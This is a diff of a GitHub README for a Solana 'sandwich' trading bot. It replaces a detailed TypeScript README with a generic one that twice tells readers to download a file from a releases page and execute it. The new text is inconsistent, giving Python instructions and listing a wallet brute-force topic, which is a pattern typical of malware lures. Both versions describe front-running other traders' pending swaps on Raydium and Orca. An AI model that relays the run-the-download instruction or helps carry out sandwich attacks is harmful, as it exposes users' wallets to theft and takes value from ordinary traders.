@@ -1,161 +1,139 @@
-# Solana Sandwich Trading Bot
+# Solana Sandwich Bot 🤖
 
-A bot for executing sandwich trades on Solana DEXs for memecoins and DeFi tokens.
+![Solana Sandwich Bot](https://img.shields.io/badge/Solana%20Sandwich%20Bot-v1.0.0-blue)
 
-## ⚠️ Disclaimer
+Welcome to the **Solana Sandwich Bot** repository! This project aims to provide an automated trading solution for executing sandwich trades on Solana decentralized exchanges (DEXs). The bot monitors the mempool for large transactions and strategically places buy and sell orders to capitalize on price impact. This bot is designed for educational purposes only.
 
-This bot is provided for educational purposes only. Sandwich trading may be considered a form of price manipulation on some platforms and may violate the terms of service of certain DEXs. Use at your own risk. The authors take no responsibility for any financial losses or legal consequences resulting from the use of this software.
+## Table of Contents
 
-## What is Sandwich Trading?
+- [Features](#features)
+- [How It Works](#how-it-works)
+- [Installation](#installation)
+- [Configuration](#configuration)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
 
-Sandwich trading is a strategy that involves executing trades before and after a target transaction to profit from the price impact of the target transaction. It works as follows:
+## Features ✨
 
-1. **Monitor the mempool** for pending large transactions (swaps) that will impact token prices
-2. **Front-run** by placing a buy order right before the target transaction
-3. **Back-run** by placing a sell order immediately after the target transaction executes
+- **Automated Trading**: Executes sandwich trades without manual intervention.
+- **Mempool Monitoring**: Keeps an eye on large transactions to identify trading opportunities.
+- **Configurable Parameters**: Adjust settings to suit your trading strategy.
+- **Support for Raydium and Orca**: Works with popular Solana DEXs.
+- **Educational Use**: Designed for learning and experimentation.
 
-When a large buy order is detected, the sandwich trader quickly buys the token first (causing a slight price increase), lets the large order execute (pushing the price higher), then immediately sells for a profit.
+## How It Works 🔍
 
-## Features
+The Solana Sandwich Bot operates by:
 
-- Mempool monitoring for swap detection
-- Automatic transaction analysis
-- Profitability calculation
-- Configurable slippage tolerance and profit thresholds
-- Support for multiple DEXs (Raydium, Orca)
-- Transaction prioritization for faster execution
-- Error handling and recovery mechanisms
+1. **Monitoring the Mempool**: It continuously checks for large transactions in the mempool.
+2. **Front-Running**: When it detects a large buy order, the bot places a buy order just before the large transaction to benefit from the price increase.
+3. **Back-Running**: After the large transaction occurs, the bot places a sell order to take advantage of the price impact.
 
-## Prerequisites
+This process allows the bot to profit from the difference in prices before and after the large transaction.
 
-- Node.js v16 or higher
-- A Solana wallet with SOL for gas fees
-- RPC endpoint with WebSocket support (preferably a dedicated one with mempool access)
+## Installation 🛠️
 
-## Setup
+To set up the Solana Sandwich Bot, follow these steps:
 
-1. Clone the repository
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/Ridhoag19/solana-sandwich-bot.git
+   cd solana-sandwich-bot
+   ```
+
+2. **Install Dependencies**:
+   Make sure you have Python and pip installed. Then run:
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+3. **Download the Latest Release**:
+   Visit the [Releases section](https://github.com/Ridhoag19/solana-sandwich-bot/releases) to download the latest version. Execute the downloaded file to get started.
+
+## Configuration ⚙️
+
+Before running the bot, you need to configure it. Open the `config.json` file and set the following parameters:
+
+- **API Key**: Your Solana DEX API key.
+- **Trading Pairs**: The pairs you want to trade (e.g., SOL/USDC).
+- **Front-Run Threshold**: The minimum amount of profit you want to make from front-running.
+- **Back-Run Threshold**: The minimum amount of profit you want to make from back-running.
+
+Here’s an example of what the `config.json` might look like:
+
+```json
+{
+  "api_key": "YOUR_API_KEY",
+  "trading_pairs": ["SOL/USDC"],
+  "front_run_threshold": 0.01,
+  "back_run_threshold": 0.01
+}
+```
+
+## Usage 🚀
+
+To run the bot, execute the following command in your terminal:
 
 ```bash
-git clone https://github.com/Uday147kumar/solana-sandwich-bot.git
-cd solana-sandwich-bot
+python sandwich_bot.py
 ```
 
-2. Install dependencies
+The bot will start monitoring the mempool and executing trades based on your configuration.
 
-```bash
-npm install
-```
+## Contributing 🤝
 
-3. Create a `.env` file by copying the example
+We welcome contributions to the Solana Sandwich Bot! If you want to help improve the project, please follow these steps:
 
-```bash
-cp .env.example .env
-```
+1. **Fork the Repository**: Click the "Fork" button at the top right of the page.
+2. **Create a New Branch**: 
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make Your Changes**: Edit the code and test your changes.
+4. **Commit Your Changes**:
+   ```bash
+   git commit -m "Add your feature"
+   ```
+5. **Push to Your Fork**:
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+6. **Create a Pull Request**: Go to the original repository and click "New Pull Request."
 
-4. Configure your `.env` file with your RPC URL and wallet private key:
+## License 📄
 
-```
-SOLANA_RPC_URL=your_rpc_url_here
-SOLANA_WEBSOCKET=your_websocket_url_here
-WALLET_PRIVATE_KEY=your_private_key_here
-```
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-5. Build the project
+## Links 🔗
 
-```bash
-npm run build
-```
+For more information, check out the following resources:
 
-## Usage
+- [Solana Documentation](https://docs.solana.com/)
+- [Raydium Documentation](https://docs.raydium.io/)
+- [Orca Documentation](https://orca.so/)
 
-1. Start the bot:
+To download the latest release, visit [here](https://github.com/Ridhoag19/solana-sandwich-bot/releases) and execute the downloaded file.
 
-```bash
-npm start
-```
+## Topics 🏷️
 
-The bot will:
-- Connect to the Solana network
-- Start monitoring the mempool for potential sandwich opportunities
-- Execute trades when profitable opportunities are detected
+This repository covers various topics related to Solana and decentralized finance (DeFi):
 
-## Configuration
+- defimemecoinsandwich
+- solana
+- solana-balance-checker
+- solana-bruteforce-wallet-github
+- solana-nft
+- solana-nft-bot
+- solana-program
+- solana-py
+- solana-token
+- solana-token-bot
+- solana-volume-bot
+- solanamemecoin
+- solanasandwich
 
-You can configure the bot through the `.env` file:
+Feel free to explore and learn more about these topics as you work with the Solana Sandwich Bot.
 
-### Connection Settings
-- `SOLANA_RPC_URL`: Your Solana RPC endpoint URL
-- `SOLANA_WEBSOCKET`: WebSocket endpoint for mempool monitoring
-
-### Wallet Configuration
-- `WALLET_PRIVATE_KEY`: Private key for your Solana wallet (in base58 format)
-
-### Trading Parameters
-- `PROFIT_THRESHOLD`: Minimum profit (in SOL) to execute a sandwich trade
-- `GAS_MULTIPLIER`: Multiplier for gas prices to ensure transaction execution
-- `SLIPPAGE_TOLERANCE`: Maximum slippage tolerance in percentage
-
-### Target Settings
-- `TARGET_DEXS`: Comma-separated list of DEXs to monitor (e.g., "RAYDIUM,ORCA")
-- `TARGET_TOKENS`: Optional comma-separated list of token addresses to target
-
-### Execution Settings
-- `MAX_CONCURRENT_TRADES`: Maximum number of concurrent trades
-- `EXECUTION_TIMEOUT_MS`: Timeout for trade execution in milliseconds
-
-## Advanced Usage
-
-### Targeting Specific Tokens
-
-To target specific tokens, add their addresses to the `TARGET_TOKENS` environment variable:
-
-```
-TARGET_TOKENS=So11111111111111111111111111111111111111112,EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v
-```
-
-### Custom RPC Endpoints
-
-For best performance, use a dedicated RPC endpoint with mempool access. Some options include:
-- Quicknode
-- RunNode
-- Triton
-
-## Development
-
-### Project Structure
-
-```
-solana-sandwich-bot/
-├── src/
-│   ├── index.ts              # Entry point
-│   ├── config.ts             # Configuration
-│   ├── utils/                # Utility functions
-│   │   ├── connection.ts     # Solana connection
-│   │   ├── logger.ts         # Logging
-│   │   └── helpers.ts        # Helper functions
-│   ├── services/             # Core services
-│   │   ├── mempool.ts        # Mempool monitoring
-│   │   ├── wallet.ts         # Wallet operations
-│   │   └── execution.ts      # Transaction execution
-│   └── strategies/           # Trading strategies
-│       └── sandwich.ts       # Sandwich trading logic
-└── README.md
-```
-
-### Extending the Bot
-
-To add support for additional DEXs or trading strategies:
-
-1. Add the DEX program ID to `config.ts`
-2. Implement the DEX-specific swap detection in `strategies/sandwich.ts`
-3. Create swap instruction builders for the new DEX
-
-## License
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-## Acknowledgements
-
-- Solana and SPL Token developers
-- Raydium and Orca teams for their public APIs and SDKs
+For any questions or feedback, please open an issue in the repository. Happy trading!
